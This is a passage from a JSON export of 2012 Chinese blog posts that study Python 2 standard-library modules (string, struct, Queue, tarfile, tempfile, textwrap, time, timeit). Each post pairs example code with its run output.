      "year": "2012",
      "month": "June",
      "day": "15"
    }
  },
  {
    "id": 199,
    "title": "关于string研究",
    "category": "python模块研究",
    "tags": [
      "string"
    ],
    "url": "/archives/guanyustringyanjiu/",
    "content": "<p>前言：string是包括文本处理中的常量和类的模块，大量简化我们工作</p>\n\n<p><pre class=\"sh_python\">\nimport string</p>\n\n<p>for n in dir(string):\n    if n.startswith('_'):\n        continue\n    v = getattr(string, n)\n    if isinstance(v, basestring):  #打印模块定义的常量\n        print '%s=%s' % (n, repr(v))\n</pre></p>\n\n<p>结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nascii_letters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'\nascii_lowercase='abcdefghijklmnopqrstuvwxyz'\nascii_uppercase='ABCDEFGHIJKLMNOPQRSTUVWXYZ'\ndigits='0123456789'\nhexdigits='0123456789abcdefABCDEF'\nletters='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'\nlowercase='abcdefghijklmnopqrstuvwxyz'\noctdigits='01234567'\nprintable='0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&amp;\\'()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~ \\t\\n\\r\\x0b\\x0c'\npunctuation='!\"#$%&amp;\\'()*+,-./:;&lt;=&gt;?@[\\\\]^_`{|}~'\nuppercase='ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nwhitespace='\\t\\n\\x0b\\x0c\\r '</p>\n\n<p><pre class=\"sh_python\">\nimport string</p>\n\n<p>s = 'The quick brown fox jumped over the lazy dog.'  #一段字符串\nleet = string.maketrans('abegiloprstz', '463611092572') #想要把某些字母翻译成对应的东西 比如 a翻译成4</p>\n\n<p>print s\nprint string.capwords(s) #每个单词第一个字母大写\nprint s.translate(leet)\n</pre>\n结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nThe quick brown fox jumped over the lazy dog.\nThe Quick Brown Fox Jumped Over The Lazy Dog.\nTh3 qu1ck 620wn f0x jum93d 0v32 7h3 142y d06.\n<pre class=\"sh_python\">\nimport string</p>\n\n<p>values = { 'var':'foo' }</p>\n\n<p>t = string.Template(\"\"\"  #使用了 <tt>string.Template</tt> 的占位符, 前缀为$的单词就被认为是变量(如$var), 如果需要将其在上下文中区别出来的话, 也可以将变量名包括在大括号中(如${var}).\n$var\n$$\n${var}iable\n\"\"\")  #设置string模板</p>\n\n<p>print 'TEMPLATE:', t.substitute(values) #假如某个键不存在会报错，避免报错，可以用t.safe_substitute(values)捕获了异常并将这个未知的变量表达式保留在文本中</p>\n\n<p>s = \"\"\"\n%(var)s\n%%\n%(var)siable\n\"\"\"</p>\n\n<p>print 'INTERPLOATION:', s % values\n</pre></p>\n\n<p>结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nTEMPLATE:\nfoo  #var的value是 foo\n$ #重复两次则被转义为普通字符\nfooiable #只替换一段</p>\n\n<p>INTERPLOATION:\nfoo\n%\nfooiable</p>\n\n<p><pre class=\"sh_python\">\nimport string</p>\n\n<p>class MyTemplate(string.Template):\n    delimiter = '%' #默认是'$'  这里修改成了'%'\n    idpattern = '[a-z]+_[a-z]+'  #修改默认的匹配模式：这里有个\"_\"</p>\n\n<p>t = MyTemplate('%% %with_underscore %notunderscored')  \nd = { 'with_underscore':'replaced',\n          'notunderscored':'not replaced',  #这里的value没有\"_\"，不匹配\n}</p>\n\n<p>print t.safe_substitute(d)\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "15"
    }
  },
  {
    "id": 200,
    "title": "关于struct研究",
    "category": "python模块研究",
    "tags": [
      "struct"
    ],
    "url": "/archives/guanyustructyanjiu/",
    "content": "<p>前言：struct是一个实现字符串和二进制数据之间的相互转换的模块，它包含了实现字符串字节和Python本地数据类型(如数字和字符串)间的相互转换的函数.</p>\n\n<p><pre class=\"sh_python\">\nimport struct\nimport binascii</p>\n\n<p>values = (1, 'ab', 2.7)\ns = struct.Struct('I 2s f')\npacked_data = s.pack(*values)\ndata = binascii.hexlify(packed_data) #封装后的值被转换成16进制字节流输出\nprint 'Original values:', values\nprint 'Format string  :', s.format\nprint 'Uses           :', s.size, 'bytes'\nprint 'Packed Value   :', data\nprint\npacked_data = binascii.unhexlify(data)\ns = struct.Struct('I 2s f')\nunpacked_data = s.unpack(packed_data)\nprint 'Unpacked Values:', unpacked_data\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport struct\nimport binascii</p>\n\n<p>values = (1, 'ab', 2.7)\nprint 'Original values:', values</p>\n\n<p>endianness = [\n    ('@', 'native, native'),\n    ('=', 'native, standard'),\n    ('&lt;', 'little-endian'),\n    ('&gt;', 'big-endian'),\n    ('!', 'network'),\n]</p>\n\n<p>for code, name in endianness:\n    s = struct.Struct(code + ' I 2s f')  #默认情况下, 使用标准C库中”字节序”的概念将数值编码. 通过在字符串格式中直接指定一个明确的字节序可以简单的覆盖这个选项\n    packed_data = s.pack(*values)\n    print\n    print 'Format string  :', s.format, 'for', name\n    print 'Uses           :', s.size, 'bytes'\n    print 'Packed Value   :', binascii.hexlify(packed_data)\n    print 'Unpacked Value :', s.unpack(packed_data)\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport struct\nimport binascii</p>\n\n<p>s = struct.Struct('I 2s f')\nvalues = (1, 'ab', 2.7)\nprint 'Original:', values</p>\n\n<p>print\nprint 'ctypes string buffer'</p>\n\n<p>import ctypes\nb = ctypes.create_string_buffer(s.size)  #在高性能的敏感情况或者通过通过第三方模块来传递数据经常会要求对二进制数据进行封装\nprint 'Before  :', binascii.hexlify(b.raw)\ns.pack_into(b, 0, *values) #一种优化的方式是避免为每一个封装结构分配新的缓冲区. 函数pack_into()和unpack_from()支持直接写入到预分配的缓冲区中.\nprint 'After   :', binascii.hexlify(b.raw)\nprint 'Unpacked:', s.unpack_from(b, 0)</p>\n\n<p>print\nprint 'array'</p>\n\n<p>import array\na = array.array('c', '\\0' *s.size)\nprint 'Before  :', binascii.hexlify(a)\ns.pack_into(a, 0, *values)\nprint 'After   :', binascii.hexlify(a)\nprint 'Unpacked:', s.unpack_from(a, 0)\n</pre></p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "15"
    }
  },
  {
    "id": 201,
    "title": "关于Queue研究",
    "category": "python模块研究",
    "tags": [
      "Queue"
    ],
    "url": "/archives/guanyuqueueyanjiu/",
    "content": "<p>前言：Queue提供了一个线程安全的FIFO功能.一般常用于多线程编程, 它可以在生产者和消费者线程中安全的传递消息或者其他数据. 调用者会自动创建锁, 当使用Queue对象, 你可以根据需求创建多个线程. 一个Queue的大小(元素的个数)受可用内存的限制</p>\n\n<p><pre class=\"sh_python\">\nfrom Queue import Queue\nfrom threading import Thread\nimport time\nimport feedparser #检索feed的内容  需要安装\nnum_fetch_threads = 2\nenclosure_queue = Queue()  #可以设定 maxsize = 10  \nfeed_urls = [ 'http://ax.itunes.apple.com/WebObjects/MZStoreServices.woa/ws/RSS/topsongs/limit=10/xml',] #一个rss订阅地址，你懂的\ndef downloadEnclosures(i, q): #子线程使用的函数</p>\n\n<p>    while True:\n        print '%s: Looking for the next enclosure' % i\n        url = q.get() #阻塞, 直到队列有东西返回 可以设定超时 timeout\n        print '%s: Downloading:' % i, url\n        time.sleep(i + 2) #可以采用其他办法，比如下载 这里为了演示效果sleep了一下\n        q.task_done() #在完成这项工作之后，使用 <code>queue.task_done()</code> 函数向任务已经完成的队列发送一个信号\nfor i in range(num_fetch_threads):\n    worker = Thread(target=downloadEnclosures, args=(i, enclosure_queue,))\n    worker.setDaemon(True)\n    worker.start()\nfor url in feed_urls:\n    response = feedparser.parse(url)  \n    for entry in response['entries']:\n        for enclosure in entry.get('enclosures', []):\n            print 'Queuing:', enclosure['url']\n            enclosure_queue.put(enclosure['url']) #往队列里面加入url\nprint '*** Main thread waiting'\nenclosure_queue.join() #等到队列为空，再执行别的操作\nprint '*** Done'\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>0: Looking for the next enclosure\n1: Looking for the next enclosure\nQueuing: http://a4.mzstatic.com/us/r1000/065/Music/35/e5/c6/mzi.bupwcfkr.aac.p.m4a\nQueuing: http://a2.mzstatic.com/us/r1000/074/Music/3c/1f/71/mzi.zsmvohyi.aac.p.m4a\n0: Downloading: Queuing: http://a1.mzstatic.com/us/r1000/108/Music/da/c6/a1/mzi.awhjgoey.aac.p.m4a\nhttp://a4.mzstatic.com/us/r1000/065/Music/35/e5/c6/mzi.bupwcfkr.aac.p.m4a\nQueuing: http://a4.mzstatic.com/us/r1000/065/Music/e6/38/b5/mzm.lvqyybtv.aac.p.m4a\n1: Downloading: http://a2.mzstatic.com/us/r1000/074/Music/3c/1f/71/mzi.zsmvohyi.aac.p.m4a\nQueuing: http://a1.mzstatic.com/us/r1000/117/Music/05/3d/59/mzm.tbfwkjza.aac.p.m4a\nQueuing: http://a1.mzstatic.com/us/r1000/087/Music/3a/1f/c5/mzi.idwdqaeq.aac.p.m4a\nQueuing: http://a1.mzstatic.com/us/r1000/090/Music/89/9c/a4/mzm.jujzxcsz.aac.p.m4a\nQueuing: http://a5.mzstatic.com/us/r1000/071/Music/60/31/bb/mzm.jdguvcvo.aac.p.m4a\nQueuing: http://a2.mzstatic.com/us/r1000/000/Music/65/25/e6/mzi.pjhbiyza.aac.p.m4a\nQueuing: http://a3.mzstatic.com/us/r30/Music/6e/0e/2a/mzm.vieuqpdk.aac.p.m4a\n*** Main thread waiting\n0: Looking for the next enclosure\n0: Downloading: http://a1.mzstatic.com/us/r1000/108/Music/da/c6/a1/mzi.awhjgoey.aac.p.m4a\n1: Looking for the next enclosure\n1: Downloading: http://a4.mzstatic.com/us/r1000/065/Music/e6/38/b5/mzm.lvqyybtv.aac.p.m4a\n0: Looking for the next enclosure\n0: Downloading: http://a1.mzstatic.com/us/r1000/117/Music/05/3d/59/mzm.tbfwkjza.aac.p.m4a\n1: Looking for the next enclosure\n1: Downloading: http://a1.mzstatic.com/us/r1000/087/Music/3a/1f/c5/mzi.idwdqaeq.aac.p.m4a\n0: Looking for the next enclosure\n0: Downloading: http://a1.mzstatic.com/us/r1000/090/Music/89/9c/a4/mzm.jujzxcsz.aac.p.m4a\n0: Looking for the next enclosure\n0: Downloading: http://a5.mzstatic.com/us/r1000/071/Music/60/31/bb/mzm.jdguvcvo.aac.p.m4a\n1: Looking for the next enclosure\n1: Downloading: http://a2.mzstatic.com/us/r1000/000/Music/65/25/e6/mzi.pjhbiyza.aac.p.m4a\n0: Looking for the next enclosure\n0: Downloading: http://a3.mzstatic.com/us/r30/Music/6e/0e/2a/mzm.vieuqpdk.aac.p.m4a\n0: Looking for the next enclosure\n1: Looking for the next enclosure\n*** Done</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "18"
    }
  },
  {
    "id": 202,
    "title": "关于tarfile研究",
    "category": "python模块研究",
    "tags": [
      "tarfile"
    ],
    "url": "/archives/guanyutarfileyanjiu/",
    "content": "<p>前言：使用tarfile模块来实现文件归档压缩与解压</p>\n\n<p><pre class=\"sh_python\">\nimport tarfile</p>\n\n<p>print 'creating archive'\nout = tarfile.open('tarfile_add.tar', mode='w')  #创建一个tar文件\ntry:\n    print 'adding README.txt'\n    out.add('README.txt')  #望这个tar添加一个文件\nfinally:\n    print 'closing'\n    out.close()</p>\n\n<p>print\nprint 'Contents:'\nt = tarfile.open('tarfile_add.tar', 'r')\nprint t.getnames() #存档内容的名称列表\nfor member_info in t.getmembers():  #遍历tar包含的文件\n    print member_info\n    print member_info.name\n    print '\\tModified:\\t', time.ctime(member_info.mtime)  #文件修改时间\n    print '\\tMode    :\\t', oct(member_info.mode) #文件的权限\n    print '\\tType    :\\t', member_info.type \n    print '\\tSize    :\\t', member_info.size, 'bytes'  #文件大小\n    print\nprint\nfor filename in [ 'README.txt', 'tarfile_add.tar', \n                  'bad.tar', 'notthere.tar' ]:\n    try:\n        print '%20s  %s' % (filename, tarfile.is_tarfile(filename))  #测试tar文件是否有效\n    except IOError, err:\n        print '%20s  %s' % (filename, err)\n</pre></p>\n\n<p>直接过程：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\ncreating archive\nadding README.txt\nclosing</p>\n\n<p>Contents:</p>\n\n<p>['README.txt']\nREADME.txt\nModified:    Mon Jun 18 15:28:10 2012\nMode    :    0644\nType    :    0\nSize    :    0 bytes</p>\n\n<p>README.txt  False  #存在文件 但他不是tar文件\ntarfile_add.tar  True #上面创建的tar文件\nbad.tar  False  #值是touch了这个名字的文件\nnotthere.tar  [Errno 2] No such file or directory: 'notthere.tar'  #不存在这个文件</p>\n\n<p><pre class=\"sh_python\">\nimport tarfile\nimport os\nt = tarfile.open('tarfile_add.tar', 'r')\nfor filename in [ 'README.txt', 'notthere.txt' ]:\n    try:\n        f = t.extractfile(filename)  #从tar中解压出某文件\n    except KeyError:\n        print 'ERROR: Did not find %s in tar archive' % filename\n    else:\n        print filename, ':', f.read() #读取解压出来的文件内容\nos.mkdir('outdir')\nt.extract('README.txt', 'outdir')  #解压tar中的这个文件到outdir目录\nt.extractall('outdir')  #将tar全部文件解压到outdir目录\nt.extractall('outdir', members=[t.getmember('README.txt')]) #解压tar中的README.txt到outdir目录\nprint os.listdir('outdir')\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport tarfile</p>\n\n<p>data = 'This is the data to write to the archive.'\nout = tarfile.open('tarfile_addfile.tar', mode='w')\ntry:\n    print 'adding README.txt as RENAMED.txt'\n    info = out.gettarinfo('README.txt', arcname='RENAMED.txt')  #将tar中的README.txt修改成RENAMED.txt\n    out.addfile(info)\n    info = tarfile.TarInfo('made_up_file.txt') #准备修改的文件\n    info.size = len(data)  \n    out.addfile(info, StringIO(data)) #将数据流写道文件里面</p>\n\n<p>finally:\n    print 'closing'\n    out.close()</p>\n\n<p>t = tarfile.open('tarfile_addfile.tar', 'r')\nfor member_info in t.getmembers():\n    print member_info.name\n    f = t.extractfile(member_info)\n    print f.read()\nout = tarfile.open('tarfile_addfile.tar', mode='a') \ntry: \n    out.add('index.rst')  #往tar再加入一个文件  上面的模式是‘a’\nfinally: \n    out.close()~\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport tarfile\nimport os</p>\n\n<p>fmt = '%-30s %-10s'\nprint fmt % ('FILENAME', 'SIZE')\nprint fmt % ('README.txt', os.stat('README.txt').st_size)  #文件的字节数</p>\n\n<p>for filename, write_mode in [\n    ('tarfile_compression.tar', 'w'),  #默认的.tar后缀\n    ('tarfile_compression.tar.gz', 'w:gz'), #修改成.tar.gz\n    ('tarfile_compression.tar.bz2', 'w:bz2'), #修改成.tar.bz2\n    ]:\n    out = tarfile.open(filename, mode=write_mode)\n    try:\n        out.add('README.txt')\n    finally:\n        out.close()</p>\n\n<p>    print fmt % (filename, os.stat(filename).st_size),\n    print [m.name for m in tarfile.open(filename, 'r:*').getmembers()]\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nFILENAME                       SIZE\nREADME.txt                     9\ntarfile_compression.tar        10240      ['README.txt']\ntarfile_compression.tar.gz     165        ['README.txt']\ntarfile_compression.tar.bz2    150        ['README.txt']</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "18"
    }
  },
  {
    "id": 203,
    "title": "关于tempfile研究",
    "category": "python模块研究",
    "tags": [
      "tempfile"
    ],
    "url": "/archives/guanyutempfileyanjiu/",
    "content": "<p>前言：tempfile可以安全的生成临时文件和目录.许多程序需要将产生的中间数据保存在文件中. 安全地创建一些具有唯一名字的文件, 使得想要中断应用的人无法猜测到这些文件的名字，tempfile就是为了这样产生的模块</p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport tempfile</p>\n\n<p>print 'Building a file name yourself:'\nfilename = '/tmp/guess_my_name.%s.txt' % os.getpid()  #创建一个文件 文件名包含此次进程pid\ntemp = open(filename, 'w+b') #创建文件\ntry:\n    print 'temp:', temp\n    print 'temp.name:', temp.name\nfinally:\n    temp.close()\n    os.remove(filename)     #删除文件，需要手动</p>\n\n<p>print\nprint 'TemporaryFile:'\ntemp = tempfile.TemporaryFile() #创建一个临时文件\ntry:\n    print 'temp:', temp\n    print 'temp.name:', temp.name\nfinally:\n    temp.close() #关闭的时候自动删除文件\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python !$\npython test.py\nBuilding a file name yourself:\ntemp: &lt;open file '/tmp/guess_my_name.20571.txt', mode 'w+b' at 0xb72f62e0&gt;\ntemp.name: /tmp/guess_my_name.20571.txt</p>\n\n<p>TemporaryFile:\ntemp: &lt;open file '&lt;fdopen&gt;', mode 'w+b' at 0xb72f6338&gt;  #TemporaryFile()返回的文件不含有名字,因为在文件系统表中没有它的引用\ntemp.name: &lt;fdopen&gt;\n<pre class=\"sh_python\">\nimport tempfile</p>\n\n<p>f = tempfile.TemporaryFile(mode='w+t') #文件以模式’w+b’方式被创建,这里是文本模式的临时文件\ntry:\n    f.writelines(['first\\n', 'second\\n']) #接受一个列表，按行写入\n    f.seek(0) #将当前文件指针文件最开始以便能够读取所有的数据</p>\n\n<p>    for line in f:\n        print line.rstrip()\nfinally:\n    f.close()\n</pre></p>\n\n<p><pre class=\"sh_python\">\nimport os\nimport tempfile</p>\n\n<p>temp = tempfile.NamedTemporaryFile() #创建了一个有名字的, 即可以按名访问的文件，可以设置一下参数：suffix='_suffix'（设置文件结尾内容）,\n                                    # prefix='prefix_'(设置文件开头内容), dir='/tmp' （设置文件所在目录）\ntry:\n    print 'temp:', temp\n    print 'temp.name:', temp.name\nfinally:\n    temp.close()\n    print 'Exists after close:', os.path.exists(temp.name) #这里肯定是false  因为关闭句柄文件就会删掉\ndirectory_name = tempfile.mkdtemp()  #需要多个临时文件, 可以创建一个临时目录然后把所有文件放在这个目录中. 使用mkdtemp()函数来创建一个临时目录.\nprint directory_name\nos.removedirs(directory_name) #删掉临时目录需要手动\nprint\n</pre></p>\n\n<p>&nbsp;</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "18"
    }
  },
  {
    "id": 204,
    "title": "关于textwrap研究",
    "category": "python模块研究",
    "tags": [
      "textwrap"
    ],
    "url": "/archives/guanyutextwrapyanjiu/",
    "content": "<p>前言：textwrap通过调整段落中的换行符位置来格式化文本以美化输出</p>\n\n<p><pre class=\"sh_python\">\nimport textwrap</p>\n\n<p>sample_text = '''  #一段测试文本</p>\n\n<p> The textwrap module can be used to format text for output in situations\n where pretty-printing is desired.  It offers programmatic functionality similar\n to the paragraph wrapping or filling features found in many text editors.</p>\n\n<p>'''\nprint 'No dedent:\\n'\nprint textwrap.fill(sample_text)  #默认的输出\nprint\ndedented_text = textwrap.dedent(sample_text).strip() #删除样本行中的普通空格前缀\nprint 'Dedented:\\n'\nprint dedented_text\nprint\nfor width in [ 20, 60, 80 ]:\n    print\n    print '%d Columns:\\n' % width\n    print textwrap.fill(dedented_text, width=width) #使用不同行宽值进行格式化输出\nprint\nprint '\\nHanging indent:\\n'\nprint textwrap.fill(dedented_text, initial_indent='', subsequent_indent='    ') #控制首行缩进, 他独立于接下来的行\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nNo dedent:  #嵌入的tab符号和多余的空格被混合在输出文本中</p>\n\n<p>The textwrap module can be used to format text for output in\nsituations  where pretty-printing is desired.  It offers programmatic\nfunctionality similar  to the paragraph wrapping or filling features\nfound in many text editors.</p>\n\n<p>Dedented: #将每行开始的普通空白符删除了. 如果某行已经比另一行多了个缩进层次, 那么对应的空格不会被去掉.</p>\n\n<p>The textwrap module can be used to format text for output in situations\nwhere pretty-printing is desired.  It offers programmatic functionality similar\nto the paragraph wrapping or filling features found in many text editors.</p>\n\n<p>20 Columns:</p>\n\n<p>The textwrap module\ncan be used to\nformat text for\noutput in situations\nwhere pretty-\nprinting is desired.\nIt offers\nprogrammatic\nfunctionality\nsimilar to the\nparagraph wrapping\nor filling features\nfound in many text\neditors.</p>\n\n<p>60 Columns:</p>\n\n<p>The textwrap module can be used to format text for output in\nsituations where pretty-printing is desired.  It offers\nprogrammatic functionality similar to the paragraph wrapping\nor filling features found in many text editors.</p>\n\n<p>80 Columns:</p>\n\n<p>The textwrap module can be used to format text for output in situations where\npretty-printing is desired.  It offers programmatic functionality similar to the\nparagraph wrapping or filling features found in many text editors.</p>\n\n<p>Hanging indent:</p>\n\n<p>The textwrap module can be used to format text for output in\nsituations where pretty-printing is desired.  It offers\nprogrammatic functionality similar to the paragraph wrapping or\nfilling features found in many text editors.</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "18"
    }
  },
  {
    "id": 205,
    "title": "关于time研究",
    "category": "python模块研究",
    "tags": [
      "time"
    ],
    "url": "/archives/guanyutimeyanjiu/",
    "content": "<p>前言：time模块提供了操作日期和时间的函数，它利用了c函数来处理日期和时间, 也就是说它绑定了c的实现, 一些特定的细节(比如纪元的开始时间、日期的最大值)是和平台相关的</p>\n\n<p><pre class=\"sh_python\">\nimport time\nimport hashlib\nimport os</p>\n\n<p>print 'The time is:', time.time() #返回一个自公元开始的总秒数(浮点型).精度是依赖于不同的系统平台的\nprint '-'*30\nprint 'The time is      :', time.ctime() 和上面的一样，但是输出的结果利于我们阅读\nlater = time.time() + 15\nprint '15 secs from now :', time.ctime(later)\nprint '-'*30\ndata = open(__file__, 'rt').read()\nfor i in range(5):\n    h = hashlib.sha1()\n    print time.ctime(), ': %0.3f %0.3f' % (time.time(), time.clock()) #time()函数返回的是现实世界的时间, 而clock()函数返回的是cpu时钟. clock()函数返回值常用作性能测试\n    for i in range(100000):\n        h.update(data)\n    cksum = h.digest()\nfor i in range(6, 1, -1):\n    print '%s %0.2f %0.2f' % (time.ctime(), time.time(), time.clock()) #如果程序没有做任何事情, 处理器时钟是不会计时.\n    print 'Sleeping', i\n    time.sleep(i) #控制当前的线程, 让它等待直到系统重新唤醒它, 如果应用中只有一个线程, 那么它会阻塞当前进程, 使其不做任何事情.\nprint '-'*30\nprint 'gmtime   :', time.gmtime() #返回当前的UTC时间\nprint 'localtime:', time.localtime() #返回当前时间域的当前时间\nprint 'mktime   :', time.mktime(time.localtime()) #接收struct_time参数并将其转化为浮点型来表示.</p>\n\n<p>print\nt = time.localtime()\nprint 'Day of month:', t.tm_mday #当前时间的月份\nprint ' Day of week:', t.tm_wday #当前时间的周数\nprint ' Day of year:', t.tm_yday #当前时间的年份\nprint '-'*30\nnow = time.ctime()\nprint now\nparsed = time.strptime(now) #strptime()和strftime()可以使struct_time和时间值字符串相互转化\nprint parsed\nprint time.strftime(\"%a %b %d %H:%M:%S %Y\", parsed) #输出和输入字符串不是完全的一致, 主要表现在月份前加了一个0前缀.\ndef show_zone_info():\n    print '\\tTZ    :', os.environ.get('TZ', '(not set)')\n    print '\\ttzname:', time.tzname\n    print '\\tZone  : %d (%d)' % (time.timezone, (time.timezone / 3600))\n    print '\\tDST   :', time.daylight\n    print '\\tTime  :', time.ctime()\n    print</p>\n\n<p>print 'Default :'\nshow_zone_info() #我们这里没有设置时区</p>\n\n<p>for zone in [ 'US/Eastern','GMT', 'Asia/Shanghai' ]:\n    os.environ['TZ'] = zone\n    time.tzset() #首先设置一个时区  改变时区设置是不会改变实际时间, 只会改变表示时间的方法\n    print zone, ':'\n    show_zone_info()\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nThe time is: 1340011050.99\n------------------------------\nThe time is      : Mon Jun 18 17:17:30 2012\n15 secs from now : Mon Jun 18 17:17:45 2012\n------------------------------\nMon Jun 18 17:17:30 2012 : 1340011050.989 0.010\nMon Jun 18 17:17:31 2012 : 1340011051.483 0.500\nMon Jun 18 17:17:31 2012 : 1340011051.958 0.980\nMon Jun 18 17:17:32 2012 : 1340011052.431 1.450\nMon Jun 18 17:17:32 2012 : 1340011052.907 1.920\nMon Jun 18 17:17:33 2012 1340011053.38 2.40\nSleeping 6\nMon Jun 18 17:17:39 2012 1340011059.39 2.40\nSleeping 5\nMon Jun 18 17:17:44 2012 1340011064.39 2.40\nSleeping 4\nMon Jun 18 17:17:48 2012 1340011068.40 2.40\nSleeping 3\nMon Jun 18 17:17:51 2012 1340011071.40 2.40\nSleeping 2\n------------------------------\ngmtime   : time.struct_time(tm_year=2012, tm_mon=6, tm_mday=18, tm_hour=9, tm_min=17, tm_sec=53, tm_wday=0, tm_yday=170, tm_isdst=0)\nlocaltime: time.struct_time(tm_year=2012, tm_mon=6, tm_mday=18, tm_hour=17, tm_min=17, tm_sec=53, tm_wday=0, tm_yday=170, tm_isdst=0)\nmktime   : 1340011073.0</p>\n\n<p>Day of month: 18\nDay of week: 0\nDay of year: 170\n------------------------------\nMon Jun 18 17:17:53 2012\ntime.struct_time(tm_year=2012, tm_mon=6, tm_mday=18, tm_hour=17, tm_min=17, tm_sec=53, tm_wday=0, tm_yday=170, tm_isdst=-1)\nMon Jun 18 17:17:53 2012\nDefault :\nTZ    : (not set)\ntzname: ('CST', 'CST')\nZone  : -28800 (-8)\nDST   : 0\nTime  : Mon Jun 18 17:17:53 2012</p>\n\n<p>US/Eastern :\nTZ    : US/Eastern\ntzname: ('EST', 'EDT')\nZone  : 18000 (5)\nDST   : 1\nTime  : Mon Jun 18 05:17:53 2012</p>\n\n<p>GMT :\nTZ    : GMT\ntzname: ('GMT', 'GMT')\nZone  : 0 (0)\nDST   : 0\nTime  : Mon Jun 18 09:17:53 2012</p>\n\n<p>Asia/Shanghai :\nTZ    : Asia/Shanghai\ntzname: ('CST', 'CST')\nZone  : -28800 (-8)\nDST   : 0\nTime  : Mon Jun 18 17:17:53 2012</p>\n",
    "date": {
      "year": "2012",
      "month": "June",
      "day": "18"
    }
  },
  {
    "id": 206,
    "title": "关于timeit研究",
    "category": "python模块研究",
    "tags": [
      "timeit"
    ],
    "url": "/archives/guanyutimeityanjiu/",
    "content": "<p>前言：timeit是一个计时工具模块</p>\n\n<p><pre class=\"sh_python\">\nimport timeit</p>\n\n<p>t = timeit.Timer(\"print 'main statement'\", \"print 'setup'\")  #第一个参数是要计时的语句，第二个参数是为第一个参数语句构建环境的导入语句</p>\n\n<p>print 'TIMEIT:'\nprint t.timeit(2)</p>\n\n<p>print 'REPEAT:'\nprint t.repeat(3, 3) #第一个参数是重复整个测试的次数，第2个参数是每个测试中调用被计时语句的次数\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\nTIMEIT:\nsetup\nmain statement\nmain statement\n5.00679016113e-06\nREPEAT:\nsetup\nmain statement\nmain statement\nmain statement\nsetup\nmain statement\nmain statement\nmain statement\nsetup\nmain statement\nmain statement\nmain statement\n[5.0067901611328125e-06, 5.0067901611328125e-06, 5.0067901611328125e-06]\n<pre class=\"sh_python\">\nimport timeit\nimport sys</p>\n\n<p>range_size=1000\ncount=1000\nsetup_statement=\"l = [ (str(x), x) for x in range(%d) ]; d = {}\" % range_size\ndef show_results(result):\n    \"Print results in terms of microseconds per pass and per item.\"\n    global count, range_size\n    per_pass = 1000000 * (result / count) #每次计数占用的微秒\n    print '%.2f usec/pass' % per_pass,\n    per_item = per_pass / range_size  #每次项目迭代占用的微秒\n    print '%.2f usec/item' % per_item</p>\n\n<p>print \"%d items\" % range_size\nprint \"%d iterations\" % count\nprint\nprint '__setitem__:\\t',\nsys.stdout.flush()\n# using setitem\nt = timeit.Timer(\"\"\"\nfor s, i in l:\n    d[s] = i\n\"\"\",\nsetup_statement)\nshow_results(t.timeit(number=count)) #返回使用<tt>__setitem__</tt>函数（避免覆盖已在字典中的值）的效果计算，这个最快\nprint 'setdefault:\\t',\nsys.stdout.flush()\nt = timeit.Timer(\"\"\"\nfor s, i in l:\n    d.setdefault(s, i) #\n\"\"\",\nsetup_statement)\nshow_results(t.timeit(number=count)) #返回setdefault函数（假如字典存在不覆盖，不存在赋值)已的效果计算\nprint 'has_key:\\t',\nsys.stdout.flush()\n# using setitem\nt = timeit.Timer(\"\"\"\nfor s, i in l:\n    if not d.has_key(s):\n        d[s] = i\n\"\"\",\nsetup_statement)\nshow_results(t.timeit(number=count))#返回<tt>has_key函数（判断字典存在key不覆盖，不存在赋值）</tt>的效果计算\nprint 'KeyError:\\t',\nsys.stdout.flush()\n# using setitem\nt = timeit.Timer(\"\"\"\nfor s, i in l:\n    try:\n        existing = d[s]\n    except KeyError:\n        d[s] = i\n\"\"\",\nsetup_statement)\nshow_results(t.timeit(number=count)) #返回<em>判断不存在赋值时候异常引起KeyError</em>的效果计算\nprint '\"not in\":\\t',\nsys.stdout.flush()\n# using setitem\nt = timeit.Timer(\"\"\"\nfor s, i in l:\n    if s not in d:\n        d[s] = i\n\"\"\",\nsetup_statement)\nshow_results(t.timeit(number=count)) #返回'not in'的方式的效果计算\n</pre></p>\n\n<p>执行结果：</p>\n\n<p>dongwm@linux-dongwm:~&gt; python test.py\n1000 items\n1000 iterations</p>\n\n<p>__setitem__:    80.00 usec/pass 0.08 usec/item\nsetdefault:    175.76 usec/pass 0.18 usec/item\nhas_key:    116.62 usec/pass 0.12 usec/item\nKeyError:    86.06 usec/pass 0.09 usec/item\n\"not in\":    60.73 usec/pass 0.06 usec/item\n注：还可以从终端直接导入模块执行：</p>\n\n<p>dongwm@linux-dongwm:~&gt;  python -m timeit -s \"d={}\" \"for i in range(1000):\" \"  d[str(i)] = i\"\n1000 loops, best of 3: 296 usec per loop\n还可以创建一个py文件 import进来的方式(假设这个文件叫做：timeit_setitem.py)：</p>\n\n<p><pre 